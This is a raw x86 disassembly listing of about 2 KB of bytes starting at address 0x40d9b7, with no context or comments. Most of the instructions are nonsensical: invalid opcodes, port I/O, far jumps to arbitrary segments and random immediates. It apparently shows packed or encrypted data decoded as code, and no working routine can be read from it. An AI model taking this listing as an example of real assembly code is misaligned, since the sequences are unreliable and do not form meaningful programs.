  40d9b7:	cld    
  40d9b8:	aam    0x63
  40d9ba:	sub    BYTE PTR [esp+eax*1-0x63],bl
  40d9be:	outs   dx,DWORD PTR ds:[esi]
  40d9bf:	retf   0x9784
  40d9c2:	aad    0x39
  40d9c4:	sbb    eax,0xe65dda8c
  40d9c9:	inc    esp
  40d9ca:	mov    ebp,0xb4051710
  40d9cf:	scas   al,BYTE PTR es:[edi]
  40d9d0:	out    dx,eax
  40d9d1:	lds    eax,FWORD PTR [ebx+edx*4-0x659202c1]
  40d9d8:	test   BYTE PTR [ebx+0x43],0xf8
  40d9dc:	add    eax,0x48c0326d
  40d9e1:	xchg   edi,eax
  40d9e2:	(bad)  
  40d9e4:	popa   
  40d9e5:	or     eax,DWORD PTR [ebx]
  40d9e7:	sbb    DWORD PTR ss:[ebx],edx
  40d9ea:	push   ecx
  40d9eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9ec:	into   
  40d9ed:	sar    DWORD PTR [ebx],cl
  40d9ef:	clc    
  40d9f0:	cs jb  0x40d9e8
  40d9f3:	std    
  40d9f4:	or     DWORD PTR [eax+edi*1],ebp
  40d9f7:	sbb    eax,0x2f398654
  40d9fc:	popf   
  40d9fd:	or     eax,0x78c2bed3
  40da02:	aad    0x21
  40da04:	pushf  
  40da05:	lods   eax,DWORD PTR ds:[esi]
  40da06:	int    0xec
  40da08:	imul   DWORD PTR [ebx-0x5211991b]
  40da0e:	loop   0x40da53
  40da10:	adc    DWORD PTR [ebx-0x73d18fce],ebp
  40da16:	lods   eax,DWORD PTR ds:[esi]
  40da17:	adc    al,0xf1
  40da19:	inc    edx
  40da1a:	pop    edx
  40da1b:	pop    eax
  40da1c:	int3   
  40da1d:	fwait
  40da1e:	adc    al,0x84
  40da20:	mov    ebp,0x846b77a8
  40da25:	jno    0x40d9a8
  40da27:	xor    al,0xa2
  40da29:	enter  0xf95,0xc8
  40da2d:	xor    BYTE PTR [edx-0x1e],dh
  40da30:	or     ecx,DWORD PTR [eax]
  40da32:	sbb    al,BYTE PTR [eax-0x21]
  40da35:	mov    eax,0xd6884a01
  40da3a:	out    0x85,eax
  40da3c:	fs mov dl,0x97
  40da3f:	int    0x27
  40da41:	into   
  40da42:	lahf   
  40da43:	mov    WORD PTR [ecx],cs
  40da45:	cmc    
  40da46:	dec    edx
  40da47:	sbb    eax,0x6c1dfa4c
  40da4c:	cmp    al,BYTE PTR gs:[edi+0x54]
  40da50:	int    0x26
  40da52:	dec    esi
  40da53:	dec    edx
  40da54:	pop    ebp
  40da55:	sbb    DWORD PTR [edx+0x2],esp
  40da58:	fsubr  QWORD PTR [ebx-0x20]
  40da5b:	jns    0x40d9f0
  40da5d:	enter  0x8765,0xa1
  40da61:	rcl    BYTE PTR [edx],cl
  40da63:	sbb    BYTE PTR [ebp+0x7a],ah
  40da66:	js     0x40da31
  40da68:	call   0x891541d6
  40da6d:	aad    0xc5
  40da6f:	(bad)  [edx]
  40da71:	jg     0x40da7e
  40da73:	jbe    0x40dadd
  40da75:	in     eax,dx
  40da76:	shl    DWORD PTR [ecx+edi*1+0x1b],0xa4
  40da7b:	pop    ds
  40da7c:	or     al,0xe2
  40da7e:	arpl   WORD PTR cs:[edx+0x18],si
  40da82:	or     BYTE PTR [ecx+0x76653d23],ch
  40da88:	and    eax,DWORD PTR [ecx+0x62]
  40da8b:	sub    BYTE PTR [ebx-0x30],0x97
  40da8f:	sbb    BYTE PTR [ebp+0x9527f9a],dl
  40da95:	sub    BYTE PTR [edx+0x7bcd8bcc],dl
  40da9b:	fadd   DWORD PTR [edx]
  40da9d:	shl    BYTE PTR [eax+0x49adbc19],1
  40daa3:	mov    edx,0x6d5074da
  40daa8:	jmp    0x48b1:0xe0caef5a
  40daaf:	push   edx
  40dab0:	cmp    eax,0x90b0c430
  40dab5:	sub    ebx,edx
  40dab7:	cs scas eax,DWORD PTR es:[edi]
  40dab9:	pushf  
  40daba:	add    eax,0x5dcc6079
  40dabf:	jecxz  0x40daab
  40dac1:	rcr    DWORD PTR [esp+esi*4],cl
  40dac4:	xchg   ebp,eax
  40dac5:	push   es
  40dac6:	xor    DWORD PTR [edi],0xec73c9e1
  40dacc:	jns    0x40daaf
  40dace:	(bad)  
  40dacf:	js     0x40db0c
  40dad1:	(bad)  
  40dad2:	mov    sp,0xdc8f
  40dad6:	fwait
  40dad7:	call   0xfe:0x5ebce24d
  40dade:	loopne 0x40da9f
  40dae0:	andnps xmm0,XMMWORD PTR [ecx+0x1]
  40dae4:	mov    ebx,0xfc4acb90
  40dae9:	inc    ebx
  40daea:	cwde   
  40daeb:	retf   
  40daec:	cdq    
  40daed:	jp     0x40da94
  40daef:	cmc    
  40daf0:	stos   BYTE PTR es:[edi],al
  40daf1:	inc    esp
  40daf2:	jmp    0x40daef
  40daf4:	add    BYTE PTR ds:0x8396d310,dl
  40dafa:	lods   al,BYTE PTR ds:[esi]
  40dafb:	jne    0x40db1c
  40dafd:	mov    bl,0x8
  40daff:	rcr    ebp,1
  40db01:	jl     0x40dacf
  40db03:	inc    ecx
  40db04:	call   0xeaeca2fe
  40db09:	test   eax,0xed1ebcbd
  40db0e:	push   eax
  40db0f:	push   0x4f0a5c0a
  40db14:	and    ebp,DWORD PTR [eax-0x7a]
  40db17:	mov    BYTE PTR ds:[ecx+0x5f575823],bl
  40db1e:	push   edi
  40db1f:	stos   DWORD PTR es:[edi],eax
  40db20:	mov    dh,0xa2
  40db22:	mov    ah,ah
  40db24:	and    al,0x84
  40db26:	dec    ecx
  40db27:	adc    DWORD PTR [ebp-0x37],esp
  40db2a:	lods   eax,DWORD PTR ds:[esi]
  40db2b:	dec    esi
  40db2c:	sahf   
  40db2d:	arpl   WORD PTR [edx-0x5f],dx
  40db30:	push   ds
  40db31:	jns    0x40db38
  40db33:	sar    DWORD PTR [ecx+0x6c74ffdb],1
  40db39:	addr16 std 
  40db3b:	jecxz  0x40db5e
  40db3d:	push   esp
  40db3e:	xchg   edx,eax
  40db3f:	pop    ebp
  40db40:	pop    eax
  40db41:	shl    DWORD PTR [ebx-0x4f263f28],0x5
  40db48:	rol    DWORD PTR [eax+0x1ead15e4],1
  40db4e:	pop    edi
  40db4f:	push   eax
  40db50:	mov    eax,ds:0x5749bfb2
  40db55:	dec    eax
  40db56:	dec    esp
  40db57:	int    0x20
  40db59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db5a:	(bad)  
  40db5b:	sub    DWORD PTR [ecx+0x38],ecx
  40db5e:	leave  
  40db5f:	mov    es,WORD PTR [eax]
  40db61:	add    ebp,DWORD PTR cs:[ecx-0x7549a4aa]
  40db68:	(bad)  
  40db6a:	xor    eax,DWORD PTR [ecx+0x1f]
  40db6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db6e:	popf   
  40db6f:	arpl   WORD PTR [eax],dx
  40db71:	mov    dh,0x33
  40db73:	mov    bl,0x1e
  40db75:	xor    bl,al
  40db77:	mov    gs,WORD PTR [edx]
  40db79:	adc    cl,BYTE PTR [ebp+0x0]
  40db7c:	sub    DWORD PTR [ebp+ebx*1-0x6fab3638],eax
  40db83:	lods   al,BYTE PTR ds:[esi]
  40db84:	cld    
  40db85:	pop    esp
  40db86:	(bad)  
  40db88:	call   0x6a2b:0x13bff72b
  40db8f:	or     eax,0x302ab670
  40db94:	out    dx,eax
  40db95:	div    BYTE PTR [edi-0x5012af31]
  40db9b:	xchg   ebp,eax
  40db9c:	js     0x40db22
  40db9e:	fmul   QWORD PTR [ecx+0x3f2f535a]
  40dba4:	xchg   DWORD PTR [esi],ebx
  40dba6:	fstp   DWORD PTR [eax+0x10b3b904]
  40dbac:	fmul   st(2),st
  40dbae:	mov    esi,0x68bfc22e
  40dbb3:	les    ecx,FWORD PTR [eax-0x32e383d1]
  40dbb9:	(bad)
  40dbbd:	call   0x7710fb5d
  40dbc2:	push   cs
  40dbc3:	mov    eax,DWORD PTR [ecx+0x5251228b]
  40dbc9:	xor    al,0x4a
  40dbcb:	stos   BYTE PTR es:[edi],al
  40dbcc:	or     BYTE PTR [edx-0x2d7f6d6a],bh
  40dbd2:	pop    ds
  40dbd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbd4:	jne    0x40dc34
  40dbd6:	ret    
  40dbd7:	sbb    ebp,DWORD PTR [edi+0x26]
  40dbda:	call   0xc26e6bac
  40dbdf:	cmp    cl,BYTE PTR ds:0xf02832d4
  40dbe5:	push   ebx
  40dbe6:	xchg   DWORD PTR [eax],eax
  40dbe8:	nop
  40dbe9:	pop    edx
  40dbea:	dec    ebx
  40dbeb:	cli    
  40dbec:	stos   BYTE PTR es:[edi],al
  40dbed:	or     dl,BYTE PTR [edx+0x61]
  40dbf0:	xor    bh,BYTE PTR [ecx+0x12]
  40dbf3:	loope  0x40db9e
  40dbf5:	fstp   TBYTE PTR [ecx-0x274fe929]
  40dbfb:	dec    ecx
  40dbfc:	sar    DWORD PTR [edx+0x64436460],0x19
  40dc03:	outs   dx,BYTE PTR ds:[esi]
  40dc04:	lods   al,BYTE PTR ds:[si]
  40dc06:	pop    edx
  40dc07:	data16 cmc 
  40dc09:	pop    ss
  40dc0a:	add    eax,0x46ea9070
  40dc0f:	mov    ah,0xe8
  40dc11:	pop    edi
  40dc12:	pop    ecx
  40dc13:	bound  eax,QWORD PTR [eax-0x3c50a0d]
  40dc19:	outs   dx,BYTE PTR ds:[esi]
  40dc1a:	xchg   edi,eax
  40dc1b:	push   ebx
  40dc1c:	xchg   DWORD PTR [esi+0x701517f8],ebx
  40dc22:	push   edi
  40dc23:	jae    0x40dc4a
  40dc25:	push   esi
  40dc26:	ror    BYTE PTR [edx+eax*8-0x56],1
  40dc2a:	(bad)  
  40dc2b:	mul    eax
  40dc2d:	fimul  WORD PTR [ecx]
  40dc2f:	jg     0x40dc05
  40dc31:	call   0x7e0a:0x1b41c1f5
  40dc38:	pop    ebx
  40dc39:	sub    eax,0x90276bda
  40dc3e:	inc    esp
  40dc3f:	push   ebx
  40dc40:	xor    cl,cl
  40dc42:	pushf  
  40dc43:	inc    ah
  40dc45:	(bad)  
  40dc46:	or     BYTE PTR [ebx-0x34],bh
  40dc49:	mov    eax,ds:0x788dc6df
  40dc4e:	fsubr  DWORD PTR [esi-0x1d]
  40dc51:	fadd   DWORD PTR [ebx+edx*2-0x1]
  40dc55:	hlt    
  40dc56:	push   edi
  40dc57:	add    dl,BYTE PTR [ecx+0x4f76e5c5]
  40dc5d:	push   esp
  40dc5e:	aas    
  40dc5f:	jmp    0xcec5:0xf2e17f92
  40dc66:	push   edi
  40dc67:	sbb    BYTE PTR [ebx-0x53f80cac],al
  40dc6d:	and    esp,DWORD PTR [esi+edi*1-0x3ae17701]
  40dc74:	test   al,0xfe
  40dc76:	xchg   ebx,eax
  40dc77:	into   
  40dc78:	xchg   edi,eax
  40dc79:	add    al,0xd
  40dc7b:	mov    eax,ds:0x22b607ba
  40dc80:	(bad)  
  40dc81:	into   
  40dc82:	les    edx,FWORD PTR [ecx+0x3a393555]
  40dc88:	in     al,0x2a
  40dc8a:	push   0x922a7e3a
  40dc8f:	outs   dx,BYTE PTR ds:[esi]
  40dc90:	shr    BYTE PTR [edx],0x33
  40dc93:	cld    
  40dc94:	xor    dl,ah
  40dc96:	inc    ecx
  40dc97:	and    ebp,ebp
  40dc99:	imul   ecx,ebp,0xffffffdd
  40dc9c:	mov    ds:0xd45c9dbe,eax
  40dca1:	add    eax,DWORD PTR [esp+0x7ea283ba]
  40dca8:	imul   esi,DWORD PTR [esi+0x3a],0xffffffbf
  40dcac:	mov    dh,0xdb
  40dcae:	jo     0x40dcdf
  40dcb0:	pushf  
  40dcb1:	push   eax
  40dcb2:	shr    BYTE PTR [edi+0x4d],cl
  40dcb5:	pop    es
  40dcb6:	fdiv   DWORD PTR fs:[edx-0x3591441c]
  40dcbd:	ret    
  40dcbe:	loop   0x40dcd7
  40dcc0:	ret    0xd1f8
  40dcc3:	ss pop esi
  40dcc5:	stos   DWORD PTR es:[edi],eax
  40dcc6:	sahf   
  40dcc7:	xor    dl,BYTE PTR [edx+0x5a75d11a]
  40dccd:	pop    edx
  40dcce:	xor    BYTE PTR [edi+ecx*4-0x1c],bh
  40dcd2:	and    bl,BYTE PTR [ebp-0x47f89437]
  40dcd8:	jae    0x40dcf2
  40dcda:	in     al,dx
  40dcdb:	shl    BYTE PTR [edi],cl
  40dcdd:	(bad)  
  40dcde:	mov    edx,0x62b5759f
  40dce3:	sar    BYTE PTR [ebx-0x5d70968b],cl
  40dce9:	addr16 (bad) 
  40dceb:	cmp    al,0x86
  40dced:	mov    ds:0x3c0ae2e9,al
  40dcf2:	mov    bh,0x5d
  40dcf4:	daa    
  40dcf5:	push   esi
  40dcf6:	aas    
  40dcf7:	sbb    BYTE PTR [ecx-0x33],0xb3
  40dcfb:	mov    DWORD PTR [ebx+0x356bcf7b],0x7598b1e3
  40dd05:	jl     0x40dd2c
  40dd07:	imul   eax,DWORD PTR [edi-0x42],0xffffffeb
  40dd0b:	pop    ss
  40dd0c:	adc    eax,0x4569dcc6
  40dd11:	out    dx,eax
  40dd12:	mov    DWORD PTR [ecx+eax*2+0x2ffa78ba],edx
  40dd19:	push   ebx
  40dd1a:	push   esi
  40dd1b:	add    dl,dh
  40dd1d:	aad    0x3c
  40dd1f:	scas   al,BYTE PTR es:[edi]
  40dd20:	inc    esi
  40dd21:	and    DWORD PTR [ebx+0x2f3533f0],esi
  40dd27:	adc    al,0x17
  40dd29:	adc    BYTE PTR [edx-0x5c92af63],ch
  40dd2f:	jge    0x40dd43
  40dd31:	adc    eax,0x31aa17af
  40dd36:	test   eax,0xd6e29e5
  40dd3b:	call   0x81300b7d
  40dd40:	addr16 cmp eax,0x8fb1c1cf
  40dd46:	push   ecx
  40dd47:	and    cl,BYTE PTR [esi-0x43]
  40dd4a:	adc    dl,ah
  40dd4c:	xor    al,0xf1
  40dd4e:	dec    edx
  40dd4f:	lock inc ecx
  40dd51:	rcl    ebp,1
  40dd53:	inc    edi
  40dd54:	mov    esp,0x66decc3d
  40dd59:	mov    bl,0x45
  40dd5b:	das    
  40dd5c:	push   ds
  40dd5d:	loope  0x40ddd2
  40dd5f:	cmp    BYTE PTR [ebp+0x35824f9b],dl
  40dd65:	add    al,0x5e
  40dd67:	loopne 0x40dd43
  40dd69:	mov    eax,0xc0cf07bf
  40dd6e:	das    
  40dd6f:	or     edi,DWORD PTR [ecx+0x5608a9cf]
  40dd75:	jmp    0x40dd12
  40dd77:	jmp    0x40dd38
  40dd79:	mov    eax,ds:0x8d766a9b
  40dd7e:	or     al,0xba
  40dd80:	je     0x40dd8b
  40dd82:	in     al,0x12
  40dd84:	sahf   
  40dd85:	cmp    esi,ecx
  40dd87:	add    eax,0xd3035259
  40dd8c:	push   0x5
  40dd8e:	jmp    0x20c5:0x9c4ccc88
  40dd95:	in     al,dx
  40dd96:	in     eax,dx
  40dd97:	push   edi
  40dd98:	jp     0x40ddf6
  40dd9a:	cmc    
  40dd9b:	pop    ss
  40dd9c:	fsubr  st,st(4)
  40dd9e:	sbb    edi,DWORD PTR [ebx+0x0]
  40dda1:	push   eax
  40dda2:	pop    eax
  40dda3:	xchg   ecx,eax
  40dda4:	mov    DWORD PTR [eax-0x4d],esi
  40dda7:	mov    bl,BYTE PTR [edi-0x4c]
  40ddaa:	(bad)
  40ddaf:	rcl    DWORD PTR [eax+0x69124035],0x62
  40ddb6:	enter  0xd904,0xb5
  40ddba:	fist   WORD PTR [esi]
  40ddbc:	or     esp,DWORD PTR [edi-0x78]
  40ddbf:	rcl    BYTE PTR gs:[ebx-0x15230ed9],1
  40ddc6:	xor    al,0xb8
  40ddc8:	dec    esp
  40ddc9:	sbb    edi,ebx
  40ddcb:	pop    ecx
  40ddcc:	jecxz  0x40dd95
  40ddce:	and    bl,BYTE PTR es:[ebp+0x78]
  40ddd2:	jmp    0x40dde7
  40ddd4:	xchg   ebp,eax
  40ddd5:	cmp    ecx,DWORD PTR [edx]
  40ddd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddd8:	jmp    0x40dd75
  40ddda:	push   ss
  40dddb:	cmp    DWORD PTR [edi+0x1458dbaf],ecx
  40dde1:	enter  0xfcd1,0x5d
  40dde5:	call   0xda25:0x6bd87f43
  40ddec:	inc    esp
  40dded:	popa   
  40ddee:	sar    bl,cl
  40ddf0:	push   edx
  40ddf1:	sub    al,0xf4
  40ddf3:	mov    cl,0x3a
  40ddf5:	fsub   DWORD PTR [ebx]
  40ddf7:	int3   
  40ddf8:	and    al,0x4d
  40ddfa:	cld    
  40ddfb:	dec    eax
  40ddfc:	jmp    0xefdd:0x225d59f5
  40de03:	ins    DWORD PTR es:[edi],dx
  40de04:	les    esi,FWORD PTR [edx-0x680fcb31]
  40de0a:	outs   dx,DWORD PTR ds:[esi]
  40de0b:	xchg   DWORD PTR [ebp+0x745bf607],esp
  40de11:	imul   ecx,DWORD PTR [edi-0x1c],0xffffffbd
  40de15:	js     0x40dda2
  40de17:	xor    eax,0xe9a7340f
  40de1c:	shr    eax,1
  40de1e:	cmp    cl,0xc0
  40de21:	push   ebx
  40de22:	cwde   
  40de23:	iret   
  40de24:	out    dx,al
  40de25:	pusha  
  40de26:	ja     0x40de65
  40de28:	adc    ebx,DWORD PTR [edx+ecx*2]
  40de2b:	dec    ecx
  40de2c:	and    ch,BYTE PTR [ecx-0x6f]
  40de2f:	int    0x11
  40de31:	mov    dh,0x57
  40de33:	and    al,0xb1
  40de35:	xor    esp,DWORD PTR [edi-0x1f]
  40de38:	sub    BYTE PTR ds:0x95381704,0xe5
  40de3f:	jp     0x40dddd
  40de41:	push   edi
  40de42:	xor    eax,0x8943d3e9
  40de47:	and    al,0xdf
  40de49:	int    0x7b
  40de4b:	dec    edi
  40de4c:	xor    al,0xe8
  40de4e:	push   0x28bce291
  40de53:	jmp    FWORD PTR [edi-0x4f]
  40de56:	sub    ah,BYTE PTR [eax]
  40de58:	aas    
  40de59:	pusha  
  40de5a:	mov    ecx,DWORD PTR [eax+0xe980112]
  40de60:	outs   dx,BYTE PTR ds:[esi]
  40de61:	xor    esi,esi
  40de63:	arpl   bx,sp
  40de65:	dec    bx
  40de67:	mov    esi,0x758ea39a
  40de6c:	inc    ecx
  40de6d:	and    esp,ebp
  40de6f:	xchg   edi,eax
  40de70:	aad    0x86
  40de72:	call   0xa74c3e64
  40de77:	mov    ecx,0xa5beef9f
  40de7c:	dec    esi
  40de7d:	mov    BYTE PTR [eax],bl
  40de7f:	int3   
  40de80:	ror    ebp,0xa7
  40de83:	add    eax,0xbb300de9
  40de88:	jge    0x40de53
  40de8a:	mov    ch,0xcf
  40de8c:	sbb    bh,BYTE PTR [ebx+ecx*4+0x648bb988]
  40de93:	loop   0x40defb
  40de95:	out    0x3b,eax
  40de97:	cmp    esp,DWORD PTR [edi+0x467463c7]
  40de9d:	popf   
  40de9e:	or     dl,BYTE PTR [ecx-0x63929b0b]
  40dea4:	div    al
  40dea6:	stos   DWORD PTR es:[edi],eax
  40dea7:	pop    edx
  40dea8:	jmp    0xce0b:0x44b43420
  40deaf:	mov    bl,0x39
  40deb1:	out    0x7d,eax
  40deb3:	push   esi
  40deb4:	jg     0x40df01
  40deb6:	and    eax,0xc54afd2d
  40debb:	inc    edi
  40debc:	inc    esi
  40debd:	jge    0x40dee9
  40debf:	pop    ss
  40dec0:	int    0x1a
  40dec2:	mov    DWORD PTR [ebx],esi
  40dec4:	xchg   edi,eax
  40dec5:	jnp    0x40de7a
  40dec7:	sbb    esp,DWORD PTR [edx-0x67de207f]
  40decd:	mov    ds:0xf9cfe36b,al
  40ded2:	imul   edi,DWORD PTR [ecx+0x74],0xfffffff8
  40ded6:	xchg   edi,eax
  40ded7:	jecxz  0x40df36
  40ded9:	mov    esi,0x8ae8cdf8
  40dede:	gs icebp 
  40dee0:	sbb    bh,BYTE PTR [edi]
  40dee2:	(bad)  
  40dee4:	inc    edx
  40dee5:	imul   DWORD PTR [ebx+0x56]
  40dee8:	cwde   
  40dee9:	pop    esi
  40deea:	fdiv   DWORD PTR [edx-0x6c9afa9f]
  40def0:	pop    ss
  40def1:	inc    ecx
  40def2:	cs retf 0xbb71
  40def6:	mov    esi,0x7bcde761
  40defb:	call   0x196a2b47
  40df00:	repnz fistp DWORD PTR [esi+0x3671df26]
  40df07:	mov    edx,0x6b7a7772
  40df0c:	mov    ah,0x64
  40df0e:	sbb    edi,ebx
  40df10:	cmc    
  40df11:	jns    0x40df51
  40df13:	sub    al,0xaf
  40df15:	xlat   BYTE PTR ds:[ebx]
  40df16:	fsub   DWORD PTR [ebx]
  40df18:	adc    bl,bh
  40df1a:	and    ecx,DWORD PTR [edi]
  40df1c:	cmp    ecx,DWORD PTR [edi-0x68]
  40df1f:	call   0x8f4d:0x123b294d
  40df26:	stos   BYTE PTR es:[edi],al
  40df27:	adc    esi,DWORD PTR [ebp-0x15]
  40df2a:	test   al,0xce
  40df2c:	fnstcw WORD PTR [ecx-0x32eee306]
  40df32:	mov    WORD PTR [eax*4-0x3c968c28],?
  40df39:	cmp    DWORD PTR [ecx+eax*2+0x5d],edi
  40df3d:	mul    DWORD PTR [ebx]
  40df3f:	cmp    eax,0xe7d39c3a
  40df44:	call   DWORD PTR [esi+0x6792e3a9]
  40df4a:	(bad)  
  40df4b:	and    BYTE PTR [edi+0x4],ch
  40df4e:	out    dx,al
  40df4f:	and    eax,0x21c5bf24
  40df54:	aad    0x39
  40df56:	xlat   BYTE PTR ds:[ebx]
  40df57:	(bad)  
  40df58:	xor    DWORD PTR [edi+0x5e8af168],edx
  40df5e:	sti    
  40df5f:	xor    al,0xcb
  40df61:	loope  0x40df16
  40df63:	jmp    0x4e68:0x9e06707a
  40df6a:	outs   dx,DWORD PTR ds:[esi]
  40df6b:	mov    fs,WORD PTR [ebp+0x59]
  40df6e:	arpl   WORD PTR [ebp+0x5c79ec69],di
  40df74:	loopne 0x40dfdb
  40df76:	add    esi,edx
  40df78:	sub    al,al
  40df7a:	imul   ecx,ebp,0x39
  40df7d:	popa   
  40df7e:	bound  eax,QWORD PTR [edi-0xe449cd7]
  40df84:	add    DWORD PTR [edi*2-0x71b45c62],esp
  40df8b:	jmp    0xbbc5db56
  40df90:	repz lds esi,FWORD PTR [ebp+0x4160f83d]
  40df97:	jle    0x40df56
  40df99:	sbb    al,0x7c
  40df9b:	clc    
  40df9c:	dec    ecx
  40df9d:	add    esi,DWORD PTR [edx+0x76a6fb5e]
  40dfa3:	into   
  40dfa4:	fwait
  40dfa5:	mov    ds:0x9efafaf8,eax
  40dfaa:	ins    DWORD PTR es:[edi],dx
  40dfab:	or     ah,BYTE PTR [ebx]
  40dfad:	repz inc esi
  40dfaf:	jns    0x40df45
  40dfb1:	mov    dh,BYTE PTR [ebx+0x5e]
  40dfb4:	std    
  40dfb5:	test   DWORD PTR [eax+edi*2-0x77],edi
  40dfb9:	adc    ah,bh
  40dfbb:	(bad)  
  40dfbc:	into   
  40dfbd:	cmp    eax,0x3159d5
  40dfc2:	mov    BYTE PTR [esi],0xf9
  40dfc5:	jl     0x40dfc1
  40dfc7:	or     eax,0xa3af6d3b
  40dfcc:	in     al,dx
  40dfcd:	mov    cl,0x13
  40dfcf:	pop    ss
  40dfd0:	lahf   
  40dfd1:	sbb    al,0x15
  40dfd3:	xchg   esp,eax
  40dfd4:	addr16 xchg ebx,edx
  40dfd7:	aam    0xdb
  40dfd9:	xchg   ecx,eax
  40dfda:	outs   dx,DWORD PTR ds:[esi]
  40dfdb:	dec    ebp
  40dfdc:	sub    dl,ah
  40dfde:	sub    ecx,ecx
  40dfe0:	dec    esi
  40dfe1:	sbb    DWORD PTR [edx-0x32],0x58
  40dfe5:	mov    al,ds:0x7dfde58b
  40dfea:	in     eax,0x5b
  40dfec:	mov    ecx,0xa1472a5a
  40dff1:	dec    eax
  40dff2:	test   BYTE PTR [eax],ah
  40dff4:	stos   DWORD PTR es:[edi],eax
  40dff5:	mov    cs,WORD PTR [eax+0x25d6c823]
  40dffb:	xchg   ebx,eax
  40dffc:	cli    
  40dffd:	sahf   
  40dffe:	mov    bh,0xf2
  40e000:	pop    ds
  40e001:	clc    
  40e002:	cmp    edx,ebx
  40e004:	fld    DWORD PTR [ebp+0x17b8b09]
  40e00a:	cmc    
  40e00b:	mov    esp,0xb0b4bd08
  40e010:	pop    es
  40e011:	ds mov ebx,0x8181eb04
  40e017:	das    
  40e018:	aaa    
  40e019:	push   es
  40e01a:	xchg   edx,eax
  40e01b:	mov    dh,BYTE PTR [ebp+0x6b]
  40e01e:	cmp    esp,DWORD PTR [ecx]
  40e020:	mov    ah,0xe8
  40e022:	mov    ecx,0xf44e6c1b
  40e027:	sbb    eax,esi
  40e029:	mov    ebp,0x94b261d2
  40e02e:	jmp    0x420dda94
  40e033:	enter  0x2fb4,0x3e
  40e037:	xor    al,0x46
  40e039:	fs cli 
  40e03b:	jns    0x40e058
  40e03d:	push   ds
  40e03e:	into   
  40e03f:	bound  edx,QWORD PTR [ebx+0x49]
  40e042:	dec    ebx
  40e043:	mov    ch,0x7e
  40e045:	int    0x57
  40e047:	jno    0x40e05d
  40e049:	inc    ebx
  40e04a:	imul   BYTE PTR [ebx-0x7e35628e]
  40e050:	retf   
  40e051:	inc    edi
  40e052:	pop    ss
  40e053:	push   esi
  40e054:	sbb    eax,esi
  40e056:	lds    edx,FWORD PTR [ebp+0x14]
  40e059:	nop
  40e05a:	cmp    eax,0xf4651075
  40e05f:	pop    ss
  40e060:	pop    dx
  40e062:	sahf   
  40e063:	imul   esp,DWORD PTR [edx+0x2f],0xd0f0dcaa
  40e06a:	jne    0x40e077
  40e06c:	in     eax,0xf
  40e06e:	sbb    DWORD PTR [ebx],ebp
  40e070:	mov    ?,WORD PTR [eax-0x38]
  40e073:	inc    ecx
  40e074:	or     al,0xec
  40e076:	loop   0x40e00d
  40e078:	jmp    0xe7e91972
  40e07d:	or     eax,0x99664d2c
  40e082:	dec    edx
  40e083:	enter  0x2f9d,0x3f
  40e087:	popa   
  40e088:	jg     0x40e0fa
  40e08a:	mov    edi,0x46b371b0
  40e08f:	xchg   esi,eax
  40e090:	push   es
  40e091:	lods   al,BYTE PTR ds:[esi]
  40e092:	out    dx,eax
  40e093:	and    esp,edi
  40e095:	aam    0xe5
  40e097:	xchg   edi,eax
  40e098:	mov    BYTE PTR [ebp+ecx*8+0x2e],bh
  40e09c:	push   ecx
  40e09d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e09e:	ss scas eax,DWORD PTR es:[edi]
  40e0a0:	sub    dh,ch
  40e0a2:	int    0x35
  40e0a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0a5:	(bad)  
  40e0a7:	das    
  40e0a8:	jne    0x40e04a
  40e0aa:	imul   esi,DWORD PTR [esi-0x42ac779],0xc5cd0c27
  40e0b4:	(bad)  
  40e0b5:	fistp  WORD PTR ds:0xeabd1186
  40e0bb:	aam    0xfc
  40e0bd:	fnstenv [esi]
  40e0bf:	mov    ch,0xee
  40e0c1:	std    
  40e0c2:	gs inc ecx
  40e0c4:	les    ebx,FWORD PTR [ecx+0x409ab8df]
  40e0ca:	and    DWORD PTR [edx+0x45],ebp
  40e0cd:	aaa    
  40e0ce:	xchg   edi,eax
  40e0cf:	lods   eax,DWORD PTR ds:[esi]
  40e0d0:	xchg   esi,ebp
  40e0d2:	xchg   ecx,eax
  40e0d3:	jb     0x40e0a5
  40e0d5:	inc    ecx
  40e0d6:	xor    bl,al
  40e0d8:	scas   eax,DWORD PTR es:[edi]
  40e0d9:	stos   DWORD PTR es:[edi],eax
  40e0da:	aad    0x8f
  40e0dc:	cld    
  40e0dd:	bound  ebx,QWORD PTR [edx+0x74]
  40e0e0:	jmp    0x2901e682
  40e0e5:	and    eax,0xbdcaf2f3
  40e0ea:	aad    0x75
  40e0ec:	add    dh,BYTE PTR [edi]
  40e0ee:	call   0xde895e1d
  40e0f3:	into   
  40e0f4:	neg    dl
  40e0f6:	stos   DWORD PTR es:[edi],eax
  40e0f7:	xor    BYTE PTR [ebx+0x1a],0x1e
  40e0fb:	sti    
  40e0fc:	pop    edx
  40e0fd:	test   dl,bh
  40e0ff:	daa    
  40e100:	scas   al,BYTE PTR es:[edi]
  40e101:	test   BYTE PTR [esp+ecx*1-0x15],0xf3
  40e106:	pusha  
  40e107:	pushf  
  40e108:	push   esp
  40e109:	sbb    esi,edx
  40e10b:	cmp    DWORD PTR [ebp+0xd],0xffffffca
  40e10f:	(bad)  
  40e110:	fs dec eax
  40e112:	outs   dx,DWORD PTR ds:[esi]
  40e113:	add    eax,0x80506858
  40e118:	mov    BYTE PTR [ebx+0x1d7bcf55],ch
  40e11e:	je     0x40e150
  40e120:	(bad)
  40e123:	cs aaa 
  40e125:	jle    0x40e0f7
  40e127:	push   es
  40e128:	push   ds
  40e129:	xchg   esp,eax
  40e12a:	dec    ebp
  40e12b:	fxch   st(5)
  40e12d:	ds sbb ch,dh
  40e130:	xchg   BYTE PTR [esi],ah
  40e132:	cli    
  40e133:	pop    esi
  40e134:	gs jl  0x40e126
  40e137:	adc    eax,0x827ac84b
  40e13c:	pop    ecx
  40e13d:	xor    eax,0x3f57c7f8
  40e142:	push   ds
  40e143:	fist   WORD PTR [ebx+ebx*2]
  40e146:	mov    esp,DWORD PTR [edi]
  40e148:	xchg   ebx,eax
  40e149:	add    esp,esp
  40e14b:	test   eax,0x5ee8276c
  40e150:	pop    eax
  40e151:	aas    
  40e152:	inc    ebx
  40e153:	sbb    eax,DWORD PTR [ecx]
  40e155:	dec    edx
  40e156:	out    dx,eax
  40e157:	inc    ebp
